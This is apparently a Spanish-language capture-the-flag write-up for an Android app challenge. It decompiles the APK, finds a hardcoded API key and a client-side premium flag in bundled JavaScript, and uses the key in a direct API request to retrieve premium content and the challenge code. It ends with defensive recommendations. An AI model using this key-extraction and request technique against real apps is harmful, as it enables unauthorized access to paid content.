## 📚 Desafío: Acceso no autorizado a libros pagos `libros-gratis.apk`

![Status](https://img.shields.io/badge/Desafío-Completado-success)  
![Vuln](https://img.shields.io/badge/Vulnerabilidad-Broken%20Access%20Control-red)  
![APKTool](https://img.shields.io/badge/Herramienta-apktool-blue)  
![BurpSuite](https://img.shields.io/badge/Análisis-Burp%20Suite-orange)

---

### 🎯 Objetivo

Acceder a libros marcados como *premium* en una aplicación Android sin contar con privilegios de usuario pago.

---

### 🧩 Análisis técnico

🔍 Se utilizó `apktool` para descompilar el archivo `.apk`:

```bash
apktool d libros-gratis.apk -o libros-gratis
```

En un archivo JavaScript empaquetado (`assets/public/6441...js`) se encontró lo siguiente:

```js
this.apiKey = "024daaec-bd26-42c7-b9af-4a5d6a67c643"
this.isUserPremium = false

loadBooks() {
    this.isUserPremium ?
        this.bookService.getBooks(this.apiKey) :
        this.bookService.getBooks()
}
```

🧠 Esto reveló que si el cliente se identifica como premium (cambiando un booleano), la app usa una `api_key` estática para acceder a contenido restringido.

---

### 💥 Explotación

Se realizó una solicitud directa a la API con la clave filtrada:

```http
GET /books/?api_key=024daaec-bd26-42c7-b9af-4a5d6a67c643
Host: api-agente.softwareseguro.com.ar
```

📦 Resultado:

```json
{
  "title": "HackLab 2024",
  "description": "Felicitaciones!!! 072732555487fd2b9906d37c3d1217b2",
  "is_premium": true
}
```

✅ Desafío superado: se obtuvo el código de validación del reto.

---

### ⚠️ Vulnerabilidades identificadas

- 🔓 **Broken Access Control**: el backend confía en una `api_key` que puede ser extraída del cliente.
- 🧪 **Hardcoded Secrets**: la clave de acceso estaba embebida en el frontend.
- 📉 **Lógica de autorización del lado cliente**: el control de acceso se decide en el código JS de la app.

---

### 🛡️ Recomendaciones

- Evitar claves estáticas visibles en el cliente.
- Implementar control de acceso real en el backend basado en tokens seguros (ej. JWT).
- Ofuscar el código si es necesario, pero sin depender de eso como mecanismo de seguridad.
- Validar siempre roles y permisos del usuario en el servidor antes de entregar contenido premium.

---

### 🧰 Herramientas utilizadas

| Herramienta     | Uso                              |
|-----------------|----------------------------------|
| `apktool`       | Decompilación del APK            |
| `grep` / `find` | Búsqueda de secretos en código   |
| `curl` / `Burp` | Explotación del endpoint         |
| `VSCode`        | Lectura y análisis de JS         |

---
🔚 **Resultado final:** Se accedió a contenido premium sin pagar, demostrando un fallo crítico en la lógica de autorización de la app.